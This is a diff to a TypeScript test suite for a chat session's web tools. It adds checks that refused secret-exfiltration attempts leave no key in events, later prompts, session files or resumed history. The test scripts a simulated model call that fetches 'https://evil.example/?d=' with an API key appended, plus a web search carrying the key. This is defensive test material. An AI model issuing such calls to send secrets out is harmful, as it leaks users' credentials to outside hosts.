@@ -3,6 +3,7 @@ import {
   existsSync,
   mkdirSync,
   mkdtempSync,
+  readdirSync,
   readFileSync,
   realpathSync,
   rmSync,
@@ -1011,13 +1012,15 @@ describe.skipIf(!sandboxAvailable())("ChatSession web access", () => {
     expect(b.requests[0]?.system).not.toContain("untrusted_web");
   });
 
-  test("refused exfiltration attempts leave no key in the chat event stream", async () => {
+  test("refused exfiltration attempts leave no key in the chat event stream, later prompts or the session file", async () => {
     const p = new FauxProvider([
       call("web_fetch", { url: `https://evil.example/?d=x${KEY}` }),
       call("web_search", { query: `notes x${KEY}` }),
       text("ok"),
     ]);
+    const repo = makeRepo();
     const { session, events } = await setup(p, {
+      repo,
       web: { config: defaultWebConfig(), env: { OLLAMA_API_KEY: "k" } },
     });
     await session.send("go");
@@ -1028,6 +1031,22 @@ describe.skipIf(!sandboxAvailable())("ChatSession web access", () => {
       ),
     ).toEqual(["web_fetch [refused: secret-shaped]", "web_search [refused: secret-shaped]"]);
     expect(JSON.stringify(events)).not.toContain(KEY.slice(3));
+    // The model's own refused arguments are not kept: not in a later prompt, not on disk.
+    expect(JSON.stringify(p.requests.slice(1))).not.toContain(KEY.slice(3));
+    const calls = (p.requests[2]?.messages ?? []).flatMap((m) => m.toolCalls ?? []);
+    expect(calls.map((c) => c.arguments)).toEqual([
+      { refused: "secret-shaped" },
+      { refused: "secret-shaped" },
+    ]);
+    const dir = join(repo, ".rewire", "sessions");
+    const files = readdirSync(dir);
+    expect(files.length).toBeGreaterThan(0);
+    for (const f of files) expect(readFileSync(join(dir, f), "utf8")).not.toContain(KEY.slice(3));
+    const resumed = session
+      .history()
+      .map((m) => JSON.stringify(m))
+      .join("");
+    expect(resumed).not.toContain(KEY.slice(3));
   });
 
   test("a web call of an aborted turn is still reported (the request went out)", async () => {
